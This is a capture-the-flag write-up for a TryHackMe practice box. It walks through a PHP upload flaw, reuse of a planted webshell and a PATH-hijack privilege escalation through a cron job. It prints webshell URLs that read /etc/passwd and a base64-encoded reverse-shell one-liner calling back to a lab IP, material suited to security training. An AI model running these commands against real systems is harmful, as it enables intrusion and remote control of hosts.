---
title: Tryhackme - hacker vs hacker
date: 2022-08-20 22:19:00 +0100
categories: [TryHackMe]
tags: [TryHackMe, File Upload]
render_with_liquid: false
---

# recon

I added the machine’s IP to my `/etc/hosts` as `nope.thm` then ran an `nmap` scan to find `ssh` and `http` ports open

```bash
$ sudo nmap  nope.thm  -v
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

visiting the web server shows the website has a file upload functionality

![file_upload](https://user-images.githubusercontent.com/71389295/185770220-befd6c9f-27c4-4783-a1bc-42cc8ef3fd85.png)![root](https://user-images.githubusercontent.com/71389295/185770231-52ae023a-8685-4276-be61-9ae541b80af2.png)


it was giving the following result whenever I tried to upload a file

![hacked](https://user-images.githubusercontent.com/71389295/185770223-8ed83266-43a5-4f65-b157-bbefd767817f.png)

examining the upload requests shows some commented php source code in the server response

![server_response](https://user-images.githubusercontent.com/71389295/185770241-f400586c-6d2d-4dd7-b910-81ab77a8006e.png)

```php
-->Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```

this is a basic vulnerable file upload code in PHP, where the programmer only checks for the presence of an allowed extension (in this case `.pdf`), if it’s found then the file is uploaded to the server with a random name under `cvs/` directory

I took a loot at `cvs/` but the listing was disabled

![listing_disabled](https://user-images.githubusercontent.com/71389295/185770224-7f21642a-c85d-4baf-b8b6-ab2a3ff75794.png)

at first I thought this is actual code for `upload.php` so I tried uploading some shell with the name `shellcode.pdf.php`, but after getting the same response from the server when trying to upload different files, I figured that the attacker uploaded his shell on the server and removed the upload functionality, the idea of this box is to think like a hacker who already made his was inside, so I checked for the presence of `nope.thm/cvs/shell.pdf.php` and …
 
![boom](https://user-images.githubusercontent.com/71389295/185770218-0fcd7549-9e80-40ca-a6d1-b6fb07b6c877.png)

then I tried to give it an argument via `cmd` parameter and it worked as well!

`http://nope.thm/cvs/shell.pdf.php?cmd=ls`

![cmd](https://user-images.githubusercontent.com/71389295/185770219-ee2fc1c4-2483-4e07-b284-5786d403e536.png)

next thing I did was getting the list of users on the system `http://nope.thm/cvs/shell.pdf.php?cmd=cat+/etc/passwd`, getting the user flag from `/home/lachlan/user.txt` (`http://nope.thm/cvs/shell.pdf.php?cmd=cat+/home/lachlan/user.txt`) then getting a reverse shell with `http://nope.thm/cvs/shell.pdf.php?cmd=echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuOC4xNDQuMTQ5LzEwMDAwIDA8JjEgMj4mMQo=|base64+-d|bash`)

![reverse_connection](https://user-images.githubusercontent.com/71389295/185770226-f3cf592a-8542-4138-807f-cace491d3418.png)

there was an annoying bit about this box, which is that you couldn’t spawn a pty duo to a crontab killing all `pts`s so the moment you hit `ctrl-c` by mistake you loose your shell

```php
$ python3 -c'import pty;pty.spawn("/bin/bash")'
www-data@b2r:/var/www/html/cvs$ nope
$ :cri:
/bin/bash: line 3: :cri:: command not found
$ ps aux | grep pkill
root        1715  0.0  0.1   2608   596 ?        Ss   10:35   0:00 /bin/sh -c /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
root        1717  0.0  0.1   2608   596 ?        Ss   10:35   0:00 /bin/sh -c /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
root        1720  0.0  0.1   2608   596 ?        Ss   10:35   0:00 /bin/sh -c /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

# priv esc

I found a `.bash_history` file under `/home/lachlan/` with `lachlan`'s plaintext password

```bash
$ ls /home
lachlan
$ ls /home/lachlan -a
.
..
.bash_history
.bash_logout
.bashrc
.cache
.profile
bin
user.txt
$ cat /home/lachlan/.bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "[REDACTED]" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

next we login to the machine via ssh, note that the `-T` is important not to create a `pts`m cause otherwise the `pkill` loop would kill our connection

```bash
$ ssh -T lachlan@nope.thm
lachlan@nope.thm's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:06:20 AM UTC

  System load:  0.0               Processes:             126
  Usage of /:   25.0% of 9.78GB   Users logged in:       0
  Memory usage: 51%               IPv4 address for eth0: 10.10.37.216
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

id
uid=1001(lachlan) gid=1001(lachlan) groups=1001(lachlan)
```

now to check the persistence method that the hacker left on the machine

```bash
cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

two things to note here

- `/home/lachlan/bin` is the first entry on the `PATH`
- `pkill` is invoked without an absolute file path
    
    so dropping a malicious `pkill` script under `/home/lachlan/bin` should get us `root` privileges
    
![root](https://user-images.githubusercontent.com/71389295/185770284-bdad7916-eb5d-449f-96eb-269a27db8cea.png)
